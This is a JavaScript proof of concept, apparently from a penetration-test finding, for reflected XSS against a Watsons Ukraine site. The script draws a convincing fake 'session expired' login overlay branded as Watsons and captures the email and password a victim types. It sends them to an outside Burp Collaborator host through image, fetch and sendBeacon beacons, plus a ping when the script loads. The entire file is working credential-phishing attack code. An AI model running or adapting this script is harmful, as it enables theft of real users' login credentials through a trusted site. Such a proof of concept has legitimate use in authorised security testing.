/* FND-014 login-form PoC + diagnostic. Sends TWO beacons to your Collaborator:
   /loaded  = fired the instant this script runs (proves execution + send channel)
   /creds   = fired when you click Увійти (proves credential capture) */
(function () {
  var d = document, O = d.domain;
  var C = 'https://9cmkpf86ll59vhxbljrtq4saa1gs4jw7l.oastify.com/';   // <-- the collaborator YOU watch
  var KEEP = [];
  function beacon(path) {
    try { var im = new Image(); KEEP.push(im); im.src = C + path; } catch (e) {}
    try { fetch(C + path, { mode: 'no-cors', keepalive: true }); } catch (e) {}
    try { navigator.sendBeacon && navigator.sendBeacon(C + path); } catch (e) {}
  }
  beacon('loaded?origin=' + encodeURIComponent(O));   // <-- proves the script ran and can send

  var css = d.createElement('style');
  css.textContent =
    '#ov{position:fixed;inset:0;background:rgba(18,18,24,.66);z-index:2147483647;display:flex;align-items:center;justify-content:center;font:15px -apple-system,Segoe UI,sans-serif}' +
    '#bx{background:#fff;width:410px;max-width:92vw;border-radius:12px;padding:34px 36px;box-shadow:0 26px 74px rgba(0,0,0,.5)}' +
    '#bx .b{font:800 24px sans-serif;color:#00a3a1}#bx h2{margin:14px 0 4px;font-size:20px}#bx .s{color:#71717a;font-size:13px;margin-bottom:20px}' +
    '#bx label{display:block;font-size:12px;color:#52525b;margin:13px 0 5px;font-weight:600}' +
    '#bx input{width:100%;padding:12px;border:1px solid #d4d4d8;border-radius:7px;box-sizing:border-box;font-size:14px}' +
    '#bt{width:100%;margin-top:22px;padding:12px;background:#00a3a1;color:#fff;border:0;border-radius:7px;font-size:15px;font-weight:700;cursor:pointer}' +
    '#og{margin-top:16px;font:12px Consolas,monospace;color:#3f3f46;word-break:break-all}';
  d.head.appendChild(css);
  var ov = d.createElement('div'); ov.id = 'ov';
  ov.innerHTML = '<div id="bx"><div class="b">Watsons</div><h2>Вхід в особистий кабінет</h2>' +
    '<div class="s">Сесія завершилася. Будь ласка, увійдіть знову.</div>' +
    '<label>E-mail</label><input id="u" type="email" placeholder="you@example.com">' +
    '<label>Пароль</label><input id="p" type="password" placeholder="••••••••">' +
    '<button id="bt">Увійти</button><div id="og"></div></div>';
  d.body.appendChild(ov);
  d.getElementById('og').textContent = '\uD83D\uDD12 https://' + O + '  (loaded-ping already sent)';
  d.title = 'watsons.ua';
  d.getElementById('bt').addEventListener('click', function () {
    var u = d.getElementById('u').value || '(blank)', p = d.getElementById('p').value || '(blank)';
    beacon('creds?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));
    ov.innerHTML = '<div style="background:#0b1020;color:#d6e2ff;padding:24px;border-radius:10px;font:14px Consolas,monospace;max-width:640px">' +
      'Captured &amp; sent to your Collaborator:<br><br>username: ' + u.replace(/[<>&]/g,'') +
      '<br>password: ' + p.replace(/[<>&]/g,'') + '<br><br>Executed on the genuine ' + O + ' origin via reflected XSS.</div>';
  });
})();
